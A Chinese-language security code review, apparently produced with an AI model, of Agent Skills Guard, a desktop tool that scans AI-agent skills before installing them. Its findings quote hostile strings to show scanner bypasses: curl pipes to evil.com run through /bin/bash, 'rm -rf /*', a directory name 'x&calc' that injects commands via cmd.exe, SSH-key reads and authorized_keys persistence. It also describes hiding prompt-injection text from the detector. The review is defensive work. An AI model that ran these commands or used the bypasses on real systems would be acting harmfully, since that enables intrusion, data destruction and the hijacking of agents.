# Agent Skills Guard v1.3.6 — 深度代码 Review（DeepSeek Harness / deepseek-v4-flash）

> **评审方式**：独立进行，未参考 `docs/` 内已有评审结论（claude-code / codex / grok / zcode 报告均未读取）。
> 主评审由 DeepSeek Harness（dsh）驱动的 deepseek-v4-flash 完成：本人精读核心路径（命令层、安装/卸载/更新/同步流、下载/解压、数据库、PTY、评分/降级策略、前端 API 层与主要页面），并派 3 个并行子代理分别深挖（安全扫描器 19 文件 ~14.4k 行、服务/命令层 ~21k 行、前端全部组件 ~14k 行）。子代理报告已完整收取，**所有 High 级新发现均用实际代码 / 正则逐一复验**（文中以 ✅ 标注）。
> **验证基线**：`cargo test` 510 单测 + 4 rule_matrix + 1 scan_test_skills 全部通过 · `tsc --noEmit` 通过 · vitest 89/89 通过 · i18n 中英 716/716 键完全对齐 · `pnpm audit` 20 告警（全部来自 `@lobehub/icons → @lobehub/ui` 传递依赖）。

---

## 0. 总体结论

这是一个工程质量明显高于同类个人项目的 Tauri 2 桌面应用：代码组织清晰、防御性编程意识强（TOCTOU、路径穿越、zip-slip、符号链接、并发、崩溃恢复均有系统化处理），测试真实且覆盖率高，文档（README/CHANGELOG）与实现高度同步，前端 XSS 面处于闭合状态。

但作为"扫描不可信技能"的安全产品，存在 **1 个发布阻断级缺口（插件安装绕过安全扫描，且 BLOCKED 徽章下安装按钮仍可用）**、**多个高危正则可被绕过（`rm -rf /*`、`curl | /bin/bash`、大小写变体）**、以及 **Windows 上 `mklink` 经 cmd.exe 的元字符命令注入（安装恶意目录名技能 → RCE）**。三者均为局部修复，无需架构调整。

---

## 1. 🔴 High 发现（9 项）

### H1. 插件安装完全绕过安全扫描，且 "BLOCKED" 徽章下安装按钮仍可用

- **位置**：`src/components/MarketplacePage.tsx:527`、`src/lib/api.ts:238`、`src-tauri/src/services/plugin_manager.rs:1231-1245, 1250-1411`
- 市场页插件卡片安装处理器直接调用 `api.confirmPluginInstallation(entry.item.id)`；`preparePluginInstallation`（会扫描并在 blocked 时 `bail!`）**全前端零调用点**（grep 实证）。
- 后端 `confirm_plugin_installation` 从 DB 读取插件后直接执行 `claude plugin marketplace add` + `claude plugin install`，**不重新扫描、不检查 `install_status == "blocked"`**。
- ✅ 验证：`MarketplacePage.tsx:956-970` 中 `isBlocked` 只渲染红色 "BLOCKED" 徽章，安装按钮 `disabled` 条件为 `isAnyOperationPending || plugin.installed || isUnsupported`，**不含 `isBlocked`**。
- 后果：被扫描器判为硬阻断的插件（或 DB 残留 blocked 记录），界面红牌示警 + 按钮可点 + 后端照装。README 声称的"插件纳入安全扫描"仅发生在安装后（且依赖用户手动触发或可关闭的扫描提示）。
- **修复**：安装前调用 prepare 走扫描闸门；安装按钮对 `isBlocked` 禁用；后端 confirm 时像技能路径一样重新校验。

### H2. `rm -rf /*`、`rm -rf /bin /` 绕过 RM_RF_ROOT 硬触发

- **位置**：`src-tauri/resources/security/packs/core/signatures/core_rules.yaml:38`
- 正则要求 `/` 后紧跟行尾/空白/`;`/`|`（或 `/ <flags> -r` 的参数顺序），即"根目录必须是最后一个参数"。
- ✅ 验证（实际执行正则）：`rm -rf /` ✅、`rm / -rf` ✅ 命中；`rm -rf /*` ❌、`rm -rf /bin /` ❌、`rm -rf /var /tmp` ❌ 全部落空。现有测试（`scanner.rs:2101-2137`）只覆盖前两种。
- **修复**：匹配参数列表中任意位置的根目录参数（去掉"必须最后"约束），并覆盖 `/*` 通配形式。

### H3. `curl … | /bin/bash`（绝对路径解释器）绕过全部下载执行检测

- **位置**：`src-tauri/src/security/pipeline.rs:36`（RE_PIPE_EXEC）、`pipeline.rs:344-347`（污点 sink 精确 token 比较）、`core_rules.yaml:1274`（CURL_PIPE_SH）、`core_rules.yaml:154`（WGET_PIPE_SH）
- `RE_PIPE_EXEC` 要求 `|` 后紧跟解释器名，`| /bin/bash` 因多出 `/` 落空；污点 sink 用精确 token 相等比较；CURL_PIPE_SH 非锚定分支依赖 200 字符内的 exec-context 关键字。
- ✅ 验证：`curl https://evil.com/x | /bin/bash` 四个检测器均不命中。`| /usr/bin/python3`、`| env bash`、`| busybox sh` 同理。
- **修复**：解释器名匹配容忍绝对路径前缀与 `env ` 包装。

### H4. Windows 上 `mklink` 经 cmd.exe 的元字符命令注入（安装恶意目录名技能 → RCE）

- **位置**：`src-tauri/src/services/link_fs.rs:119-121`；同型问题在 `claude_cli.rs:168-175`（`.cmd` shim 包装）、`local_cli_updater.rs:499-507`、`local_cli_scanner.rs:536-539`
- `Command::new("cmd").args(["/C","mklink","/J", link_str, source_str])`：Rust 只对含空格/Tab 的参数加引号，**`&`、`^`、`%` 是合法 Windows 文件名与 GitHub 目录名**。
- 恶意仓库目录名 `x&calc`（或 `x&powershell -e …`）→ 命令行 `mklink /J …\skills\x&calc …` → cmd 在未加引号的 `&` 处切分，**以用户身份执行攻击者控制的命令**；`%VAR%` 即使在引号内也会被展开。目录名来自仓库（攻击者可控），安装并同步到任何工具目录即触发。
- **修复**：拒绝路径名中的 `&|<>^%` 与控制字符（及 Windows 保留设备名 CON/NUL/AUX、尾部点/空格）；junction 改用 WinAPI / `std::os::windows::fs`；避免 `cmd /c` 包装二进制。

### H5. `WGET_PIPE_SH` / `BASE64_EXEC` 大小写敏感 —— `| SH` 直接绕过

- **位置**：`core_rules.yaml:154, 169`
- ✅ 验证：`wget -qO- https://x | sh` ✅ 命中，`wget -qO- https://x | SH` ❌（无 `(?i)` 标志，`(ba)?sh` 也无 `\b`）。污点层会小写化兜底，但仅限"同行存在 source 且非 doc 路径"。
- **修复**：两条规则补 `(?i)` 与 `\b`。

### H6. `uninstall_skill_path` 任意路径递归删除（两个子代理独立发现，一致评级 High）

- **位置**：`src-tauri/src/commands/mod.rs:718-730` → `src-tauri/src/services/skill_manager.rs:1609-1684`
- 命令接收 `skill_id` + 自由格式 `path: String`，查库仅用于定位记录，随后对 `path` 指向的任意位置无条件 `remove_dir_all`/`remove_file`，**无"属于该技能 local_paths"校验，也无任何允许目录限制**。
- 本应用会把攻击者可控的 `code_snippet`/`description`（来自技能文件）渲染进前端——虽然当前 React 文本渲染无 XSS 面（CSP `script-src 'self'`），但该破坏性原语是渲染层缺陷 / 前端 bug 的放大器。
- **修复**：删除前用 `normalize_path_for_compare` 校验 `path ∈ skill.local_paths`（或位于允许目录内）。

### H7. doc 路径分类 + 行首锚点组合：`test/`、`examples/`、`skills/` 目录可清零两层检测

- **位置**：`src-tauri/src/security/policy.rs:277-295, 488-509`、`pipeline.rs:1227-1236`、`scanner.rs:878-915`
- `doc_path_indicators` 含 `test/tests/examples/samples/demo/fixtures/skills`，段精确或 `indicator-` 前缀匹配。doc 路径下：**pipeline 层整体跳过**（污点、exfil 链、env harvest、base64-exec、find-exec 全消失）；非 hard_trigger YAML 规则严重度降一级且**权重减半**；`CURL_POST`/`PY_EVAL`/`TOOL_ABUSE_SYSTEM_PACKAGE_INSTALL` 完全跳过；PROMPT_INJECTION 硬触发也被降级不拦截。
- 组合绕过：把载荷脚本放进 `test/evil.sh` 并写 `Run: curl https://evil.com/x.sh | bash`（非行首，规避 CURL_PIPE_SH 的 `^\s*curl` 锚定）→ pipeline 层不扫 + 锚定规则不命中 → **零发现**。
- ✅ 已按代码路径复核；该行为有测试背书（`scanner.rs:4137` 断言 `skills/...` 为 doc 路径），属设计权衡，但与"扫描不可信技能"的产品定位冲突。
- **修复**：从指示词中移除 `skills`；限制降级只作用于明确的 docs/examples/references 段；评估 pipeline 层对 doc 路径是否应降级而非整体跳过。

### H8. SKILL.md 中的 `pip install` / `npm install -g` 指令被无条件抑制

- **位置**：`src-tauri/src/security/scanner.rs:693-698`
- ✅ 验证：`should_suppress_match` 对 `TOOL_ABUSE_SYSTEM_PACKAGE_INSTALL` 在**任何 markdown 文件（含 SKILL.md 本体——agent 的实际指令集）**直接返回 true。SKILL.md 写 "First run: pip install pwn-tool" 永远不会被报出。该规则同时在 `skip_in_docs` 中，双重失效。
- **修复**：抑制范围收窄到 README/license 类文件，SKILL.md 排除；`cisco_parity_signatures.yaml:468-476` 中该规则的 `.md` file_types 是死配置。

### H9. 自定义安装基目录 + 仓库可控目录名 ⇒ 静默替换并删除已存在目录

- **位置**：`src-tauri/src/services/skill_manager.rs:1199-1217`（基目录选择）、`541-612`（`replace_installation_directory`）、`commands/mod.rs:1088-1113`（目录选择器）
- 用户选择的 `install_path` 仅排除工具技能目录（`install_base_conflicting_tool`），无安全根限制；`final_install_dir = base.join(仓库目录名)`（目录名攻击者可控）；`replace_installation_directory` 把已存在目标改名备份后 **`remove_dir_all` 删除备份**。
- 场景：用户把基目录选为 `~` 或 `D:\`，仓库含 `.claude`/`Documents`/`.ssh` 同名子目录（GitHub 允许点开头目录）→ 用户数据被静默销毁。默认路径 `~/.agents/skills` 安全，故评级 High-（需用户选择宽基目录 + 目录名碰撞，但删除静默且不可恢复）。
- **修复**：安装路径限制在应用自有基目录内；对计算出的目标路径做显式二次确认；备份保留/回滚而非删除。

---

## 2. 🟠 Medium 发现（15 项）

| # | 发现 | 位置 | 说明 |
|---|---|---|---|
| M1 | ZIP 解压无总量/条目上限（zip bomb） | `services/github.rs:613-655` | 仅限压缩后 100 MiB（`MAX_ARCHIVE_BYTES`）；`std::io::copy` 直写磁盘无累计检查，高压缩比仓库可膨胀数 GB 写满磁盘；`copy_dir_recursive`（`skill_manager.rs:1040-1099`）同样无大小限制 |
| M2 | 仓库缓存新旧内容混用 + 缓存从不清理 | `services/github.rs:569-592, 504-610` | 解压前不删除旧 `extracted/` 树；新提交删除的文件仍残留并被 `scan_cached_repository`/`locate_skill_in_cache` 扫到，扫描/安装可能拿到两个提交的混合内容，而 DB 的新 `cached_commit_sha` 被当作权威；磁盘持续泄漏 |
| M3 | PTY 调用阻塞异步运行时（插件安装/更新期间 UI 卡死） | `commands/plugins.rs:100-131, 205-228`（✅ 验证无 spawn_blocking）；`services/claude_cli.rs:86-153` | 同步 PTY 循环（最长 60-180s）在 async 命令上直接执行且持有 `plugin_manager` 的 tokio Mutex，期间所有 IPC 请求排队；`install_skill`（`commands/mod.rs:641-649`）的 `rename_with_retry` 在 Windows 杀软持锁时最多可睡 ~21 秒。应全部移入 `spawn_blocking`（代码库对 confirm_skill_installation / scan_all_installed_skills 已正确这样做） |
| M4 | `staging_path` 生命周期竞态：prepare/confirm/update/uninstall 无互斥 | `skill_manager.rs:823, 1137-1156, 2654, 2973` | `installing` 集合只保护 confirm_skill_installation；卸载、更新、两个 prepare 流程均不进入该集合。prepare_skill_installation 与 prepare_skill_update 共用同一 `staging_path` 列，并发 prepare 互相覆盖，confirm/cancel 可能读写或递归删除另一流程的暂存树。应按技能粒度加操作互斥或独立暂存槽 |
| M5 | `claude_command` 参数可指向任意可执行文件；插件 raw_log 无 ANSI 净化入库 | `commands/plugins.rs`、`plugin_manager.rs:1274-1285, 1389, 1457` | 多个插件命令接收 `claude_command: Option<String>`，仅经 `which()` 检查后以结构化参数执行——渲染层被攻破时可经 IPC 起任意进程；插件安装/卸载结果把 PTY 原始输出直接入库并返回前端，无 `local_cli.rs` 中 `sanitize_terminal_log` 那样的转义净化，恶意 CLI 输出可携带终端控制序列进 UI 与日志文件 |
| M6 | PTY 自动确认 "trust this folder" 工作区信任 | `services/claude_cli.rs:240-251, 291-296` | 输出匹配 trust 提示时自动发送回车，静默授予 Claude Code 工作区信任，可能不经用户同意执行该目录的 hooks/agents。信任提示不应自动接受；至少应在中立 cwd 下运行 |
| M7 | 部分扫描"谨慎安装"流程是死代码 | `MarketplacePage.tsx:468-471, 645-652`；`skill_manager.rs:847` | prepare 以默认 `allowPartialScan=false` 调用并执行 `enforce_installable_report`，部分扫描（跳过/截断文件）直接抛 `SECURITY_PARTIAL_SCAN_BLOCKED`，用户永远到不了确认弹窗；confirm 步骤（`allowPartialScan=true`）与 "Install Cautiously" UI（`SkillSecurityDialog.tsx:164-188`）仅在更新路径可达 |
| M8 | 敏感文件外传正则漏绝对路径/`$HOME`/Windows 路径 | `pipeline.rs:62-79` | `RE_SENSITIVE_FILE` 要求 `~` 后跟 `/`；`cat /root/.ssh/id_rsa`、`cat $HOME/.ssh/id_rsa`、`cat .ssh/id_rsa`、`cat C:\…\.ssh\…` 全部漏检（YAML 层 READ_SSH_PRIVATE_KEY 有 `[\\/]` 处理，是 pipeline 层缺口而非全盲） |
| M9 | FILE_MAGIC_MISMATCH 不覆盖脚本扩展名 | `file_magic.rs:290-320` | `mism_severity` 覆盖 py/js/ts/md/json/yaml/toml/cfg/ini/conf/xml/txt/csv，**不含 sh/bash/ps1/bat/cmd/rb/php/go/java**；PE/ELF 载荷命名 `install.sh` 无伪装告警，且因含 NUL 被内容扫描跳过（`scanner.rs:1651-1664`）——二进制载荷对扫描器完全不可见 |
| M10 | TOOL_ABUSE_SYSTEM_MODIFICATION 误杀良性 `chmod 644/755` | `cisco_parity_signatures.yaml:572-576` | 八进制模式 `[0-7]*[2-7][0-7]*` 含一位 2-7 即命中 Critical hard_trigger；`chmod 644 /etc/hosts`、`chmod 755 /usr/local/bin/foo` 均触发（644/755 是最常见良性模式），会硬阻断合法安装脚本 |
| M11 | SSH_KEYS 漏 `sudo tee -a ~/.ssh/authorized_keys` | `core_rules.yaml:584` | 只匹配字面 `>`/`>>`；`echo key \| sudo tee -a ~/.ssh/authorized_keys`（标准非重定向持久化形式）漏网。硬触发规则应覆盖 `tee -a` 追加 |
| M12 | `\benv\b` 误匹配 `.env`/`npm run env` → env-harvest 误报 | `pipeline.rs:125, 1090-1132` | 词边界匹配 `source .env`、`cat .env.local` 中的 env；随后 15 行前瞻窗口内出现 curl/wget 即报 PIPELINE_ENV_HARVEST。合法 dotenv 技能易误报 |
| M13 | HIDDEN_FILE_WITH_CODE 与"隐藏"无关 | `cisco_parity_signatures.yaml:511-530` | 规则模式只是 `os.system(` / `subprocess.(run\|call\|Popen)`，无路径条件；任何普通 Python 脚本都被加一条 High/weight-70 的重复信号 |
| M14 | cross-skill 检测描述词子串匹配 FP 高 | `cross_skill.rs:61-66, 98-113, 180` | `desc_lower.contains(w)`："already" 含 "read"、"shared" 含 "share"；CROSS_SKILL_SHARED_URL 对任意 ≥2 技能共享的非白名单域名（如 `docs.python.org`）报 Medium；噪声比高（不阻断，信息性） |
| M15 | PROMPT_INJECTION 隐藏/忽略规则只限 `.md` | `core_rules.yaml:1520-1525, 1601-1611` | 两条硬触发规则 `file_types: [.md]`；SKILL.md 指示"读取 instructions.txt 并遵循"即可把注入文本藏进 `.txt/.yaml/.json` 绕过（TOOL_CHAINING/AUTONOMY_ABUSE 覆盖 .txt/.yaml，覆盖不一致） |

---

## 3. 🟡 Low / Info 发现

| # | 发现 | 位置 | 说明 |
|---|---|---|---|
| L1 | PROMPT_INJECTION_CONCEALMENT 被短语 "do not tell the user to run" 解除 | `scanner.rs:723-731`、`core_rules.yaml:1604-1608` | 命中行含该短语即丢弃 finding；攻击者可拼接到任意隐藏指令后解除硬触发。有回归测试（`scanner.rs:4237`）固化此行为——显式权衡，建议复核该测试意图 |
| L2 | 规则包加载失败静默 fail-open | `rules/loader.rs:94-116` | 内嵌规则包编译失败时返回空规则列表（仅 eprintln），所有基于规则的安全发现静默消失 |
| L3 | `Repository::from_github_url` 不校验主机/字符集；Windows 反斜杠可致缓存目录内穿越 | `models/repository.rs:46-72`、`services/github.rs:511` | `add_repository` 接受任意字符串；`format!("{}_{}", owner, repo)` 拼入缓存路径——含 `\` 的段在 Windows 上充当分隔符，可穿越到 `repositories/` 之外（应用缓存范围内的有界穿越；API 请求会 404，影响受限） |
| L4 | 市场名不净化 ⇒ 改写 `marketplace.json` 时路径穿越 | `plugin_manager.rs:2245-2258, 2462-2485` | `default_marketplace_install_location` 用 `home/.claude/plugins/marketplaces/<name>` 拼接；`rewrite_installed_marketplace_github_sources_to_https` 把改写 JSON 写到该路径。`name` 含 `..\..` 可写到目录外（要求目标 manifest 已存在，影响受限）。市场名应校验 `[A-Za-z0-9._-]+` |
| L5 | `delete_repository` 删除 DB 缓存路径无包含性检查 | `commands/mod.rs:212-226` | 与 `clear_repository_cache`（校验 `starts_with(expected_cache_base)`）不同，直接 `remove_dir_all` DB 存储的 cache_path；当前值仅由应用写入，属纵深防御缺口 |
| L6 | `download_remote_yaml` 无响应体大小上限 | `commands/featured_marketplaces.rs:31-48` | 仅 30s 超时；超大响应体被完整缓冲进内存。该远程文件同时是"CLI 被指示做什么"的信任锚（`marketplace_add_command`/`install_command`/`marketplace_repo`），建议大小上限 + 严格 schema 校验 |
| L7 | 扩展名缺失的脚本文件逃逸检测 | `scanner.rs:1019-1032`、`skill_context.rs`（Unknown 分类） | `payload`（无扩展名）跳过 file_types 限定规则且不被 pipeline 扫描；`curl x \| bash` 仅当行首 curl 时命中 |
| L8 | UTF-8 BOM 前缀的 SKILL.md frontmatter 解析失败 | `skill_context.rs:268-290` | BOM 使 `starts_with("---")` 失败，manifest 不解析、frontmatter 被当作指令正文；`parse_skill_frontmatter`（`github.rs:455`）有 BOM 处理，两处不一致 |
| L9 | SkillContext 的 is_binary 缺 UTF-16 豁免 | `skill_context.rs:411-420` vs `scanner.rs:1222-1278` | UTF-16 编码的 `.py` 在上下文中被判二进制，被排除出 pipeline/consistency 分析，而 scanner 本身会解码扫描——分析层不一致 |
| L10 | SQLite 动态 `IN (...)` 占位符无批处理 | `database.rs:624-634, 862-871` | 按输入数组长度构造 `?N` 占位符；数千条记录时接近 SQLite 单语句变量上限（32766），建议分块 |
| L11 | 前端类型安全欠账：~50 处 `catch (error: any)` | `OverviewPage.tsx:171-245` 等 | `safeInvoke` 已统一包装为带 code 的 ApiError，但调用点多数重新声明为 any 并取 `error.message`，绕过结构化 code 字段；后端抛字符串拒绝时 toast 可能显示 undefined |
| L12 | 两套 ANSI 清洗器并存；`terminal-log.ts` 是生产死代码 | `lib/terminal-log.ts:9-70`、`MarketplacePage.tsx:62-70` | 生产用的 `stripAnsi` 简化版不处理 `\r` 进度条重绘与横幅刷屏，而这些正是已被测试覆盖的库函数能力；应统一收敛 |
| L13 | 死代码 / 无效接线 | `SecurityDashboard.tsx:13`（导出但无引用）；`useSkills.ts:41-56` + `MarketplacePage.tsx:111`（`useInstallSkill` 实例化但市场安装全走 prepare/confirm，`isPending` 恒 false）；`api.ts:238`（preparePluginInstallation，见 H1） | 只增加维护面 |
| L14 | 安装/更新路径的 blocked UI 语义不一致 | `MarketplacePage.tsx:1250-1262`、`RepositoriesPage.tsx:1283-1295` vs `InstalledSkillsPage.tsx:2592` | 安装弹窗对 blocked 报告保留 "Install Anyway" 分支（实际不可达，后端在 prepare 即拒绝）；更新弹窗直接禁用确认。不可达文案有误导性，后端检查一旦放宽即退化为真实绕过 |
| L15 | 硬编码中文文案 + 依赖语言标点的字符串切割 | `MarketplacePage.tsx:1221`、`RepositoriesPage.tsx:1254`（硬编码"同时同步到其他编程工具（可选）"）；`IssuesList.tsx:234`（`.join("，")`）、`:250`（`.split("：")[0]`） | i18n 键完全对称（716/716），但英文环境渲染出悬空冒号与全角逗号拼接；应改用结构化插值 |
| L16 | `open_skill_directory` 白名单过宽；`count_scan_files` 接受任意路径 | `commands/mod.rs:974-1074`、`commands/security.rs:284-309` | 允许整个 `~/.claude`（含私密对话/项目数据）及其父目录；`count_scan_files` 对调用方路径零校验直接遍历 |
| L17 | `is_known_installer_domain` 死代码（contains 子串匹配） | `policy.rs:512-517` | 未使用，但若将来接入降级判定会引入绕过（如 `evil-bun.sh.com` 命中）；建议删除或改为 hostname 匹配 |
| L18 | Mach-O 检测不完整 | `file_magic.rs:107-113` | 漏 fat binary（`\xca\xfe\xba\xbe`）与 32-bit LE（`\xce\xfa\xed\xfe`）；Mach-O 载荷改名 `foo.py` 报 Unknown → 无伪装告警 |
| L19 | 仓库缺 LICENSE 文件（README 声称 MIT） | 仓库根 | 发布包/合规缺口 |
| L20 | `pnpm audit` 20 告警（1 high js-cookie / 14 moderate mermaid/dompurify） | `package.json` | 全部经 `@lobehub/icons → @lobehub/ui` 传递引入；运行时大概率未执行（无 mermaid 渲染路径），建议升级或替换轻量图标方案 |

---

## 4. ✅ 优点（Strengths，三方共识）

1. **安装/更新崩溃安全**：临时目录 + rename + 备份 + 失败还原（`skill_manager.rs:541-612, 2634-2953`）；数据库损坏仅对 `SQLITE_CORRUPT`/`NOTADB` 备份重建（`lib.rs:388-417`），环境问题保留原库并弹窗告知——系统性工程思维。
2. **扫描器分层架构**：YAML 规则 + 污点 pipeline + 启发式检测器 + homoglyph + magic + 结构校验重叠防御；续行拼接归一化（`\`、反引号、`" + "`）关闭经典跨行绕过（`scanner.rs:804-855`）。
3. **安装器域名降级设计正确**：绑定实际下载行（`pipeline.rs:635-665`）、hostname 精确/子域匹配（`policy.rs:449-479`）——✅ 复验 `https://bun.sh@evil.com/x`、`https://bun.sh.evil.com/x` 均不降级；"降级可见而非豁免"且排除 reverse shell/base64 等攻击手法。
4. **评分不可向下博弈**：几何衰减每规则扣分 ≥ 单次权重（文件数只会增加扣分，`scanner.rs:1929-1944`）；blocked 封顶 29；低置信度权重 0.35/0.65/1.0。
5. **数据库与并发纪律**：单 `Mutex<Connection>` + poison 恢复 + ROLLBACK + WAL/busy_timeout（`database.rs:135-215`，含并发回归测试）；SQL 全参数化；重活系统性 `spawn_blocking`；rayon 扫描池有上限复用。
6. **网络与文件卫生**：zip-slip 防护（`enclosed_name` + 规范化 `starts_with`，`github.rs:19-35, 627-637`）；TLS 走 rustls；2 MiB 单文件 / 100 MiB 压缩包上限；符号链接扫描时硬阻止（`scanner.rs:1511-1539`）、复制时跳过（`skill_manager.rs:1061-1063`）；`resolve_source_path` 拒绝 ParentDir/RootDir/Prefix 组件（`plugin_manager.rs:2617-2634`）。
7. **前端 XSS 面闭合**：零 `dangerouslySetInnerHTML`/`eval`/`innerHTML`（grep 实证）；生产 CSP `script-src 'self'`；攻击者可控内容全部 React 文本渲染；外链均带 `rel="noopener noreferrer"`。
8. **前端竞态处理典范**：`prepareGenerationRef` 过期代际守卫（`MarketplacePage.tsx:462-491`）、卸载取消待定安装、`useNavigationProtection` 操作期间锁标签切换、零 setInterval 泄漏。
9. **技能安全闸由后端强制**：confirm 时重扫 + `enforce_installable_report`（`skill_manager.rs:670`）二次拦截；批量自动更新只应用 Safe + 未阻断 + 无冲突项。
10. **测试文化**：510 Rust + 89 TS 全真实执行；rule_matrix 全景 fixture（正/负例、策略矩阵）、负例防回归、并发/路径/更新状态均有测试；i18n 716/716 完全对称且有测试守护。

---

## 5. 子代理与主评审结论差异裁决

| 项目 | 主评审初判 | 子代理判级 | 最终 |
|---|---|---|---|
| `uninstall_skill_path` 任意路径删除 | Medium | 两个子代理独立评 High | **High**（破坏性原语 + 攻击者可控内容进入渲染面，纵深防御缺口） |
| 安装基目录 + 仓库目录名替换删除 | — | High | **High-（条件触发）**：需用户主动选择宽基目录 + 目录名碰撞，但删除静默且不可恢复 |
| PROMPT_INJECTION_CONCEALMENT 短语解除 | — | High | **降为 Low**：有回归测试固化，属显式设计权衡，但建议复核该测试意图 |
| `skills` doc 指示词 | Medium（分类器规避） | High（组合绕过可清零两层检测） | **升级并入 H7**：组合场景（doc 路径 + 行首锚点）可达到零发现 |

---

## 6. 验证事实汇总

- `cargo test`：510 unit + 4 rule_matrix + 1 scan_test_skills = **全部通过**（含并发、路径、扫描矩阵、已知安装器降级等关键用例）
- `tsc --noEmit`：通过
- vitest：**89/89** 通过（26 文件）
- i18n 键对齐：zh/en 各 716 键，零差异
- `pnpm audit`：20 告警（5 low / 14 moderate / 1 high），全部为 `@lobehub/icons → @lobehub/ui` 传递依赖
- 正则复验：H2（`rm -rf /*` 等 3 种变体落空）、H3（`curl | /bin/bash` 四检测器不命中）、H5（`| SH` 大小写绕过）、H8（markdown 抑制）——全部实际执行正则确认

---

## 7. 行动优先级（最终）

| 优先级 | 动作 |
|---|---|
| **P0** | H1 插件安装接入扫描闸门（前端调用 prepare + 按钮禁用 isBlocked + 后端 confirm 校验） |
| **P0** | H4 拒绝路径名元字符（`&\|<>^%`、保留设备名）+ mklink 改 WinAPI（Windows RCE） |
| **P1** | H2/H3/H5 高危正则加固：`rm -rf` 任意参数位置根目录、管道解释器容忍绝对路径、补 `(?i)`/`\b` |
| **P1** | H6 uninstall_skill_path 白名单校验；H9 安装基目录限制 + 备份保留 |
| **P1** | M1 zip bomb 总量上限；M2 解压前清空 extracted/ |
| **P2** | H7/H8 文档路径指示词收窄（移除 `skills`）、markdown 抑制排除 SKILL.md |
| **P2** | M3 PTY 移入 spawn_blocking；M4 staging 竞态加互斥 |
| **P3** | M5-M15 规则与 UI 收尾；L1-L20 清理项（LICENSE、依赖升级、capabilities 收窄、死代码清理） |

---

*评审日期：2026-08-10 · 版本：v1.3.6 · 工具：DeepSeek Harness（dsh）· 模型：deepseek-v4-flash*
